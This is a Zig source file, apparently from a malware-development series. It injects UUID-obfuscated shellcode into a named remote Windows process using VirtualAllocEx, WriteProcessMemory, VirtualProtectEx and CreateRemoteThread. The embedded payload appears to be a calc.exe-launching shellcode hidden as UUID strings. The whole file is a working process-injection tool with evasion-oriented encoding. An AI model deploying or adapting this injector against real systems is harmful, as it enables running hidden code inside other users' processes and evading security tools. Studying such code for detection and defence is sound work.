const std = @import("std");
const win = std.os.windows;
const getRemoteProcessHandle = @import("./process-injection-dll-injection.zig").getRemoteProcessHandle;
const uuidDeobfuscation = @import("payload-obfuscation-uuidfuscation.zig").uuidDeobfuscation;

const HANDLE = win.HANDLE;
const WINAPI = win.WINAPI;
const BOOL = win.BOOL;
const GetLastError = win.kernel32.GetLastError;
const CloseHandle = win.CloseHandle;

const VIRTUAL_ALLOCATION_TYPE = packed struct(u32) {
    _0: u1 = 0,
    _1: u1 = 0,
    _2: u1 = 0,
    _3: u1 = 0,
    _4: u1 = 0,
    _5: u1 = 0,
    _6: u1 = 0,
    _7: u1 = 0,
    _8: u1 = 0,
    _9: u1 = 0,
    _10: u1 = 0,
    _11: u1 = 0,
    COMMIT: u1 = 0,
    RESERVE: u1 = 0,
    REPLACE_PLACEHOLDER: u1 = 0,
    _15: u1 = 0,
    FREE: u1 = 0,
    _17: u1 = 0,
    RESERVE_PLACEHOLDER: u1 = 0,
    RESET: u1 = 0,
    _20: u1 = 0,
    _21: u1 = 0,
    _22: u1 = 0,
    _23: u1 = 0,
    RESET_UNDO: u1 = 0,
    _25: u1 = 0,
    _26: u1 = 0,
    _27: u1 = 0,
    _28: u1 = 0,
    LARGE_PAGES: u1 = 0,
    _30: u1 = 0,
    _31: u1 = 0,
};

const PAGE_PROTECTION_FLAGS = packed struct(u32) {
    PAGE_NOACCESS: u1 = 0,
    PAGE_READONLY: u1 = 0,
    PAGE_READWRITE: u1 = 0,
    PAGE_WRITECOPY: u1 = 0,
    PAGE_EXECUTE: u1 = 0,
    PAGE_EXECUTE_READ: u1 = 0,
    PAGE_EXECUTE_READWRITE: u1 = 0,
    PAGE_EXECUTE_WRITECOPY: u1 = 0,
    PAGE_GUARD: u1 = 0,
    PAGE_NOCACHE: u1 = 0,
    PAGE_WRITECOMBINE: u1 = 0,
    PAGE_GRAPHICS_NOACCESS: u1 = 0,
    PAGE_GRAPHICS_READONLY: u1 = 0,
    PAGE_GRAPHICS_READWRITE: u1 = 0,
    PAGE_GRAPHICS_EXECUTE: u1 = 0,
    PAGE_GRAPHICS_EXECUTE_READ: u1 = 0,
    PAGE_GRAPHICS_EXECUTE_READWRITE: u1 = 0,
    PAGE_GRAPHICS_COHERENT: u1 = 0,
    PAGE_GRAPHICS_NOCACHE: u1 = 0,
    SEC_64K_PAGES: u1 = 0,
    _20: u1 = 0,
    _21: u1 = 0,
    _22: u1 = 0,
    SEC_FILE: u1 = 0,
    SEC_IMAGE: u1 = 0,
    SEC_PROTECTED_IMAGE: u1 = 0,
    SEC_RESERVE: u1 = 0,
    SEC_COMMIT: u1 = 0,
    PAGE_ENCLAVE_MASK: u1 = 0,
    PAGE_ENCLAVE_UNVALIDATED: u1 = 0,
    PAGE_TARGETS_NO_UPDATE: u1 = 0,
    PAGE_ENCLAVE_THREAD_CONTROL: u1 = 0,
};

extern "kernel32" fn VirtualAllocEx(
    hProcess: ?HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flAllocationType: VIRTUAL_ALLOCATION_TYPE,
    flProtect: PAGE_PROTECTION_FLAGS,
) callconv(WINAPI) ?*anyopaque;

extern "kernel32" fn WriteProcessMemory(
    hProcess: ?HANDLE,
    lpBaseAddress: ?*anyopaque,
    lpBuffer: ?*const anyopaque,
    nSize: usize,
    lpNumberOfBytesWritten: ?*usize,
) callconv(WINAPI) BOOL;

const SECURITY_ATTRIBUTES = extern struct {
    nLength: u32,
    lpSecurityDescriptor: ?*anyopaque,
    bInheritHandle: BOOL,
};

const LPTHREAD_START_ROUTINE = *const fn (
    lpThreadParameter: ?*anyopaque,
) callconv(WINAPI) u32;

extern "kernel32" fn CreateRemoteThread(
    hProcess: ?HANDLE,
    lpThreadAttributes: ?*SECURITY_ATTRIBUTES,
    dwStackSize: usize,
    lpStartAddress: ?LPTHREAD_START_ROUTINE,
    lpParameter: ?*anyopaque,
    dwCreationFlags: u32,
    lpThreadId: ?*u32,
) callconv(WINAPI) ?HANDLE;

const VIRTUAL_FREE_TYPE = enum(u32) {
    DECOMMIT = 16384,
    RELEASE = 32768,
};

extern "kernel32" fn VirtualFreeEx(
    hProcess: ?HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: usize,
    dwFreeType: VIRTUAL_FREE_TYPE,
) callconv(WINAPI) BOOL;

extern "kernel32" fn VirtualProtectEx(
    hProcess: ?HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flNewProtect: PAGE_PROTECTION_FLAGS,
    lpflOldProtect: ?*PAGE_PROTECTION_FLAGS,
) callconv(WINAPI) BOOL;

const uuid_array = [_][:0]const u8{
    "E48348FC-E8F0-00C0-0000-415141505251",
    "D2314856-4865-528B-6048-8B5218488B52",
    "728B4820-4850-B70F-4A4A-4D31C94831C0",
    "7C613CAC-2C02-4120-C1C9-0D4101C1E2ED",
    "48514152-528B-8B20-423C-4801D08B8088",
    "48000000-C085-6774-4801-D0508B481844",
    "4920408B-D001-56E3-48FF-C9418B348848",
    "314DD601-48C9-C031-AC41-C1C90D4101C1",
    "F175E038-034C-244C-0845-39D175D85844",
    "4924408B-D001-4166-8B0C-48448B401C49",
    "8B41D001-8804-0148-D041-5841585E595A",
    "59415841-5A41-8348-EC20-4152FFE05841",
    "8B485A59-E912-FF57-FFFF-5D48BA010000",
    "00000000-4800-8D8D-0101-000041BA318B",
    "D5FF876F-F0BB-A2B5-5641-BAA695BD9DFF",
    "C48348D5-3C28-7C06-0A80-FBE07505BB47",
    "6A6F7213-5900-8941-DAFF-D563616C632E",
    "00657865-0000-0000-0000-000000000000",
};

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 2) return error.MissingProcessName;

    const process_name = args[1];
    const h_process = try getRemoteProcessHandle(process_name);
    defer CloseHandle(h_process);

    const shellcode = try uuidDeobfuscation(allocator, &uuid_array);
    defer allocator.free(shellcode);

    try injectShellcodeToRemoteProcess(h_process, shellcode);
}

fn injectShellcodeToRemoteProcess(h_process: HANDLE, shellcode: []const u8) !void {
    const shellcode_address = VirtualAllocEx(
        h_process,
        null,
        shellcode.len,
        .{ .RESERVE = 1, .COMMIT = 1 },
        .{ .PAGE_READWRITE = 1 },
    ) orelse {
        std.debug.print("[!] VirtualAllocEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualAllocExFailed;
    };
    defer if (VirtualFreeEx(h_process, shellcode_address, 0, .RELEASE) == 0) {
        std.debug.print("[!] VirtualFreeEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
    };

    std.debug.print("[!] Memory Allocated For Shellcode At: {*}\n", .{shellcode_address});

    var numberOfBytesWritten: usize = undefined;
    if (WriteProcessMemory(
        h_process,
        shellcode_address,
        shellcode.ptr,
        shellcode.len,
        &numberOfBytesWritten,
    ) == 0 or numberOfBytesWritten != shellcode.len) {
        std.debug.print("[!] WriteProcessMemory Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.WriteProcessMemoryFailed;
    }

    std.debug.print("[!] Successfully Written {d} Bytes\n", .{numberOfBytesWritten});

    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
    if (VirtualProtectEx(
        h_process,
        shellcode_address,
        shellcode.len,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtectEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectExFailed;
    }

    const h_thread = CreateRemoteThread(
        h_process,
        null,
        0,
        @ptrCast(shellcode_address),
        null,
        0,
        null,
    ) orelse {
        std.debug.print("[!] CreateRemoteThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateRemoteThreadFailed;
    };
    defer CloseHandle(h_thread);

    _ = try win.WaitForSingleObject(h_thread, win.INFINITE);

    std.debug.print("[+] Done\n", .{});
}
